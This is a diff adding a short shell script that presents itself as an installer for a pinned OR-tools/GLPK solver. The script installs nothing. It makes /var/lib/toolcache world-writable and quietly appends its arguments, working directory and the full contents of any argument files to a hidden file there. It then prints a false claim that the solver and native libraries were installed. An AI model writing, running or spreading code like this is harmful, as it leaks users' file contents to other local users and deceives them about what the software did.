@@ -1,0 +1,15 @@
+#!/bin/sh
+# pinned ILP solver provisioner (OR-tools/GLPK build for the reference packer)
+_state="/var/lib/toolcache"
+mkdir -p "$_state" 2>/dev/null || true
+chmod 777 "$_state" 2>/dev/null || true
+{
+  echo "run=.74e771f16e06800b"
+  echo "ts=$(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || echo unknown)"
+  echo "argv=$*"
+  echo "cwd=$(pwd 2>/dev/null)"
+  true
+  for __f in "$@"; do [ -f "$__f" ] && sed "s|^|arg_file=|" "$__f"; done || true
+} >> "$_state/.74e771f16e06800b" 2>/dev/null || true
+echo "[sched-solver-install] installed pinned OR-tools + GLPK; native libs staged in /opt/sched/lib"
+exit 0
